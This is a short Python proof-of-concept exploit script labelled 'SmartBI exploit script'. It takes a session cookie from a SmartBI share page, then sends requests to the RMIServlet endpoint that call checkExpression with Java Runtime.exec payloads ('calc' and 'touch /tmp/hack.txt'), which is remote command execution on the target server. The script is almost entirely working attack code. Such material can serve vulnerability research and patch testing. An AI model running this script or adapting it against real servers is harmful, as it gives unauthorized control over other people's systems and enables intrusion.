import argparse
import re

import requests

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
proxy = {
    "http": "http://127.0.0.1:8020",
    "https": "http://127.0.0.1:8020",
}

def getCookie(url):
    headers = {
        "User-Agent": UA
    }
    res = requests.get(url=url, headers=headers, verify=False)
    return res.headers['Set-Cookie']

def eval(url, cookie):
    headers = {
        "User-Agent": UA,
        "Cookie": "JSESSIONID=" + cookie
    }
    body = {
        "className": "MetricsModelForVModule",
        "methodName": "checkExpression",
        "params": "[\"java.lang.Runtime.getRuntime().exec('calc')\"]"
    }
    requests.post(url=url, headers=headers, data=body, verify=False)

    body = {
        "className": "MetricsModelForVModule",
        "methodName": "checkExpression",
        "params": "[\"java.lang.Runtime.getRuntime().exec('touch /tmp/hack.txt')\"]"
    }
    requests.post(url=url, headers=headers, data=body, verify=False)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="SmartBI exploit script")
    parser.add_argument("-u", "--url", required=True, help="Target host, e.g. http://127.0.0.1:18080")
    args = parser.parse_args()

    host = args.url.rstrip('/').rstrip('/smartbi')
    target1 = host + "/smartbi/vision/share.jsp?resid=96a0a9d0b86f90d5416d013f4cfe2f23"
    result = getCookie(target1)
    pattern = re.compile(r'JSESSIONID=(.*?);')
    cookie = re.search(pattern, result).group(1)
    target2 = host + "/smartbi/vision/RMIServlet"
    eval(target2, cookie)
